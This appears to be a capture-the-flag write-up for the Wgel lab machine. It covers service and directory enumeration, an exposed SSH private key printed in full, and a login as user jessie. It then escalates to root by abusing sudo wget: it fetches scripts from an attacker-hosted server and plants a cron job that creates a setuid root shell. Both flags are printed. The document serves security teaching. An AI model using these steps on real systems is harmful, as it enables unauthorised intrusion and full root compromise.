@@ -1,0 +1,402 @@
+WGEL CTF.
+
+
+
+
+ENUMERATION: SERVICES.
+Quick nmap scan:
+nmap -sS -T4 -sV 10.10.169.44
+OUTPUT:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+
+WEB EXPLORING: 10.10.169.44
+Note:
+Landing site is the apache2 ubuntu default page. 
+Source inspect:
+Ctrl + u
+OUTPUT (snippet):
+ <!-- Jessie don't forget to udate the webiste -->
+
+
+
+
+ENUMERATION: DIRECTORIES:
+Quick gobuster scan:
+gobuster dir -u 10.10.169.44 -w /usr/share/wordlists/dirb/common.txt
+OUTPUT:
+/.hta                 (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/index.html           (Status: 200) [Size: 11374]
+/server-status        (Status: 403) [Size: 277]
+/sitemap              (Status: 301) [Size: 314] [--> http://10.10.169.44/sitemap/]
+
+
+
+
+WEB EXPLORING: 10.10.169.44/sitemap
+Note:
+We land on a website that promotes some software called UNAPP. 
+Home page:
+Nothing interesting.
+Same as with the other pages.
+
+
+
+
+ENUMERATION: FILES:
+Gobuster command:
+gobuster dir -u http://10.10.169.44 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,txt,bak,zip
+Note:
+No status 200 in output other than: /index.html, /.
+
+
+
+
+ENUMERATION: DIRECTORIES 2:
+Gobuster command:
+gobuster dir -u 10.10.253.43 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+OUTPUT:
+/sitemap              (Status: 301) [Size: 314] [--> http://10.10.169.44/sitemap/]
+/server-status        (Status: 403) [Size: 277]
+Note:
+Nothing of use.
+
+
+
+
+ENUMERATION: RECURSIVE ON /sitemap:
+gobuster dir -u http://10.10.169.44/sitemap/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 40
+OUTPUT:
+/.html                (Status: 403) [Size: 277]
+/.hta                 (Status: 403) [Size: 277]
+/.hta.php             (Status: 403) [Size: 277]
+/.hta.txt             (Status: 403) [Size: 277]
+/.hta.html            (Status: 403) [Size: 277]
+/.htaccess.php        (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/.htaccess.html       (Status: 403) [Size: 277]
+/.htaccess.txt        (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/.htpasswd.php        (Status: 403) [Size: 277]
+/.htpasswd.txt        (Status: 403) [Size: 277]
+/.htpasswd.html       (Status: 403) [Size: 277]
+/.ssh                 (Status: 301) [Size: 319] [--> http://10.10.169.44/sitemap/.ssh/]
+/about.html           (Status: 200) [Size: 12232]
+/blog.html            (Status: 200) [Size: 12745]
+/contact.html         (Status: 200) [Size: 10346]
+/css                  (Status: 301) [Size: 318] [--> http://10.10.169.44/sitemap/css/]
+/fonts                (Status: 301) [Size: 320] [--> http://10.10.169.44/sitemap/fonts/]
+/images               (Status: 301) [Size: 321] [--> http://10.10.169.44/sitemap/images/]
+/index.html           (Status: 200) [Size: 21080]
+/index.html           (Status: 200) [Size: 21080]
+/js                   (Status: 301) [Size: 317] [--> http://10.10.169.44/sitemap/js/]
+/services.html        (Status: 200) [Size: 10131]
+/shop.html            (Status: 200) [Size: 17257]
+/work.html            (Status: 200) [Size: 11428]
+
+
+Note:
+Finally, our directory enumeration gave us useful results.
+Visit http://10.10.169.44/sitemap/.ssh/.
+OUTPUT:
+Index of /sitemap/.ssh
+[ICO]	Name	Last modified	Size	Description
+[PARENTDIR]	Parent Directory	 	-	 
+[   ]	id_rsa	2019-10-26 09:24	1.6K	 
+Apache/2.4.18 (Ubuntu) Server at 10.10.169.44 Port 80
+
+
+Visit http://10.10.169.44/sitemap/.ssh/id_rsa:
+OUTPUT:
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
+m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
+W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
+y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
++J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
+Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
+/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
+AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
+M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
+SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
+2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
+p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
+7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
+dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
+GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
+shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
+uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
+LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
+QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
+V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
+hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
+9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
+eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
+QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
+jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
+-----END RSA PRIVATE KEY-----
+
+
+Visit http://10.10.169.44/sitemap/css/:
+OUTPUT:
+Index of /sitemap/css
+[ICO]	Name	Last modified	Size	Description
+[PARENTDIR]	Parent Directory	 	-	 
+[TXT]	animate.css	2016-08-08 09:43	71K	 
+[TXT]	bootstrap.css	2016-05-23 08:48	132K	 
+[TXT]	bootstrap.css.map	2016-05-23 08:48	74K	 
+[TXT]	flexslider.css	2016-12-08 13:16	6.7K	 
+[TXT]	icomoon.css	2017-03-06 09:56	35K	 
+[TXT]	magnific-popup.css	2016-08-15 11:56	7.6K	 
+[TXT]	owl.carousel.min.css	2014-12-01 03:26	3.5K	 
+[TXT]	owl.theme.default.min.css	2014-12-01 04:08	2.3K	 
+[TXT]	style.css	2018-05-11 15:15	41K	 
+[TXT]	style.css.map	2017-08-25 14:23	27K	 
+Apache/2.4.18 (Ubuntu) Server at 10.10.169.44 Port 80
+Note:
+We checked out each file. No clues in them.
+Same thing happens with following paths: 
+http://10.10.169.44/sitemap/fonts/
+http://10.10.169.44/sitemap/images/
+http://10.10.169.44/sitemap/js/
+
+
+
+
+SSH BRUTEFORCE: JESSIE:
+Note:
+Rereading our writeup, we realize we found user Jessie being mentioned in the source code of the landing site. We also have an rsa key, so we might as well try to use them for ssh. First, we copy the key to a local (on attacking machine) file called id_jessie.
+Give restricted permissions to the key:
+chmod 600 id_jessie
+
+
+Ssh connection:
+ssh -i id_jessie jessie@10.10.169.44
+OUTPUT:
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+8 packages can be updated.
+8 updates are security updates.
+
+jessie@CorpOne:~$
+Note:
+We managed to log in.
+
+
+ 
+
+EXPLORING: JESSIE USER:
+List directory:
+ls -l
+OUTPUT:
+Desktop    Downloads         Music     Public     Videos
+Documents  examples.desktop  Pictures  Templates
+
+
+Note:
+The user flag is probably readable by jessie, and stored somewhere here.
+Find user flag:
+find / -name "user.txt" 2>/dev/null
+Note:
+Surprisingly, we get no output. It looks like we are missing something.
+
+
+
+
+USER FLAG:
+Note:
+We do ls on every directory to look for clues. All are empty apart from Documents.
+List Documents:
+ls Documents
+OUTPUT:
+user_flag.txt
+
+
+Read user flag:
+cat Documents/user_flag.txt
+OUTPUT:
+057c67131c3d5e42dd5cd3075b198ff6
+
+
+
+
+PRIVESC:
+Check if sudo:
+id
+OUTPUT:
+uid=1000(jessie) gid=1000(jessie) groups=1000(jessie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+
+
+Check sudo permissions:
+sudo -l
+OUTPUT:
+Matching Defaults entries for jessie on CorpOne:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+    (ALL : ALL) ALL
+    (root) NOPASSWD: /usr/bin/wget
+Note:
+Looking at gtfobins (https://gtfobins.github.io/gtfobins/wget/), it looks like we can use it to privesc. From gtfobins:
+Sudo
+If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+
+TF=$(mktemp)
+chmod +x $TF
+echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
+sudo wget --use-askpass=$TF 0
+
+
+Note:
+We will follow gtfobins exploit.
+Create temporary file:
+TF=$(mktemp)
+
+
+Write script to spawn root shell:
+echo -e '#!/bin/sh\n/bin/sh' > $TF
+
+
+Make script executable:
+chmod +x $TF
+
+
+Run wget:
+sudo /usr/bin/wget --use-askpass=$TF 0
+OUTPUT:
+/usr/bin/wget: unrecognized option '--use-askpass=/tmp/tmp.9QSe7c5LQ3'
+Usage: wget [OPTION]... [URL]...
+
+Try `wget --help' for more options.
+Note:
+This means our wget version doesn't support --use-askpass.
+We need to change our plan.
+
+
+Note:
+We will try a simpler approach. Just grabbing and running a reverse shell.
+Create a simple reverse shell script (simple_shell.sh) on the attacker. Contents:
+#!/bin/bash
+/bin/sh
+
+
+Host HTTP server on the attacker:
+python3 -m http.server 8000
+
+
+From target machine, download script:
+sudo wget http://10.23.25.109:8000/simple_shell.sh -O /tmp/shell.sh
+OUTPUT (attacker):
+┌──(user0㉿kali)-[~]
+└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.169.44 - - [18/Jul/2025 18:16:03] code 404, message File not found
+10.10.169.44 - - [18/Jul/2025 18:16:03] "GET /shell.sh HTTP/1.1" 404 -
+OUTPUT (target):
+--2025-07-18 19:17:00--  http://10.23.25.109:8000/simple_shell.sh
+Connecting to 10.23.25.109:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 20 [text/x-sh]
+Saving to: ‘/tmp/shell.sh’
+
+/tmp/shell.sh     100%[=============>]      20  --.-KB/s    in 0,06s   
+
+2025-07-18 19:17:00 (313 B/s) - ‘/tmp/shell.sh’ saved [20/20]
+Note:
+Shell downloaded succesfully.
+
+
+Make script executable:
+sudo chmod +x /tmp/shell.sh
+OUTPUT:
+[sudo] password for jessie: 
+Note:
+This is an issue. We don't know jessie's password.
+
+
+Note:
+Visiting gtfobins (https://gtfobins.github.io/gtfobins/wget/), we will now attempt the file write exploit. 
+To start, we need a root-owned file/directory. We will test /etc/profile.d/rootme.sh.
+Create script (attacker):
+echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > rootme.sh
+
+
+Start http server (attacker):
+python3 -m http.server 8000
+
+
+Run wget (target):
+sudo wget http://10.23.25.109:8000/rootme.sh -O /etc/profile.d/rootme.sh
+OUTPUT:
+--2025-07-18 19:36:55--  http://10.23.25.109:8000/rootme.sh
+Connecting to 10.23.25.109:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 53 [text/x-sh]
+Saving to: ‘/etc/profile.d/rootme.sh’
+
+/etc/profile.d/ro 100%[=============>]      53  --.-KB/s    in 0s      
+
+2025-07-18 19:36:55 (14,0 MB/s) - ‘/etc/profile.d/rootme.sh’ saved [53/53]
+Note:
+For this exploit to work, we need the machine to reboot. We failed again.
+
+
+Note:
+We need root to execute those files. We will now try to run the exploit as a cronjob.
+Create root cron job script (attacker):
+echo '* * * * * root rm -f /tmp/rootbash; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' > rootcron
+
+
+Host server (attacker):
+python3 -m http.server 8000
+
+
+Download (machine):
+sudo wget http://10.23.25.109:8000/rootcron -O /etc/cron.d/rootcron
+
+
+Check permissions on rootbash:
+ls -l /tmp/rootbash
+OUTPUT:
+-rwsr-xr-x 1 root root 1109564 iul 18 20:17 /tmp/rootbash
+
+
+Spawn root shell:
+/tmp/rootbash -p
+rootbash-4.3#
+
+
+
+
+ROOT FLAG:
+find the flag:
+find . -type f \( -name '*root*.txt' -o -name '*flag*.txt' \) 2>/dev/null
+OUTPUT:
+./Documents/user_flag.txt
+Note:
+Looks like we didn't find it.
+
+
+Retry, flag find:
+grep -i 'flag' *.txt */*.txt */*/*.txt 2>/dev/null
+Note:
+No output.
+
+
+Note:
+Since the user flag was stored as user_flag.txt, we might aswell try our luck with root_flag.txt:
+cat /root/root_flag.txt
+OUTPUT:
+b1b968b37519ad1daa6408188649263d
